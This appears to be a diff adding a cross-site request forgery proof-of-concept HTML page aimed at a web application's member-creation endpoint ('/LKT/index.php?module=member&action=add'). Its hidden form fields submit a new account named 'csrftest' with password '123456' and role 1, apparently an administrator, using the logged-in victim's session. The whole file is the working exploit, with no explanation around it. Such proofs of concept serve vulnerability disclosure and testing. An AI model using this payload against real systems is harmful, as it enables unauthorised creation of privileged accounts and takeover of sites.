@@ -1,0 +1,14 @@
+<html>
+  <!-- CSRF PoC -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.8.130(your ip address)/LKT/index.php?module=member&action=add" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="name" value="csrftest" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="password1" value="123456" />
+      <input type="hidden" name="role" value="1" />
+      <input type="hidden" name="Submit" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
